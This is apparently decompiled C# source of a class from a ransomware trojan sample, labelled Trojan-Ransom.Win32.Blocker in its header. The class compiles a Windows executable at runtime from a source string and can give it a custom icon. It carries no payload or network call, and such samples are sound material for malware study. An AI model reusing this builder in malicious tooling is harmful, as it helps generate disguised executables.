// Decompiled with JetBrains decompiler
// Type: ConS.iCompiler
// Assembly: ConS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DF6DFB84-A1AD-4484-A97C-5153DCE38621
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.agid-b3b5624a4c48edf417f6ae8ae3abe1ee87c27bee673f03ff3ff953b84d0dad6e.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ConS
{
  public class iCompiler
  {
    public static void GenerateExecutable(string Output, string Source, string Icon)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        ICodeCompiler compiler = new VBCodeProvider().CreateCompiler();
label_2:
        num3 = 3;
        CompilerParameters options = new CompilerParameters();
label_3:
        num3 = 4;
        options.GenerateExecutable = true;
label_4:
        num3 = 5;
        options.OutputAssembly = Output;
label_5:
        num3 = 6;
        options.CompilerOptions = "/target:winexe";
label_6:
        num3 = 7;
        options.ReferencedAssemblies.Add("System.dll");
label_7:
        num3 = 8;
        options.ReferencedAssemblies.Add("System.Data.dll");
label_8:
        num3 = 9;
        options.ReferencedAssemblies.Add("System.Windows.Forms.dll");
label_9:
        num3 = 10;
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
label_10:
        num3 = 11;
        dictionary.Add("CompilerVersion", "v2.0");
label_11:
        num3 = 12;
        options.CompilerOptions = "/filealign:0x00000200 /optimize+ /platform:X86 /debug- /target:winexe";
label_12:
        num3 = 13;
        string str = Path.GetTempPath() + "\\iCompiler.ico";
label_13:
        num3 = 14;
        if (Operators.CompareString(Icon, "", false) == 0)
          goto label_16;
label_14:
        num3 = 15;
        File.Copy(Icon, str);
label_15:
        num3 = 16;
        CompilerParameters compilerParameters = options;
        compilerParameters.CompilerOptions = compilerParameters.CompilerOptions + " /win32icon:" + str;
label_16:
        num3 = 18;
        CompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, Source);
label_17:
        num3 = 19;
        if (compilerResults.Errors.Count <= 0)
          goto label_25;
label_18:
        num3 = 20;
        IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
        goto label_22;
label_20:
        num3 = 21;
        object objectValue;
        int num4 = (int) MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject((object) "Error: ", NewLateBinding.LateGet(objectValue, (System.Type) null, "ErrorText", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))), "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
label_21:
        num3 = 22;
label_22:
        if (enumerator.MoveNext())
        {
          objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
          goto label_20;
        }
        else if (enumerator is IDisposable)
        {
          (enumerator as IDisposable).Dispose();
          goto label_26;
        }
        else
          goto label_26;
label_25:
        num3 = 24;
        if (compilerResults.Errors.Count != 0)
          ;
label_26:
        num3 = 26;
        if (Operators.CompareString(Icon, "", false) == 0)
          goto label_34;
label_27:
        num3 = 27;
        File.Delete(str);
        goto label_34;
label_29:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
              case 25:
              case 26:
                goto label_26;
              case 24:
                goto label_25;
              case 27:
                goto label_27;
              case 28:
              case 29:
                goto label_34;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_29;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_34:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
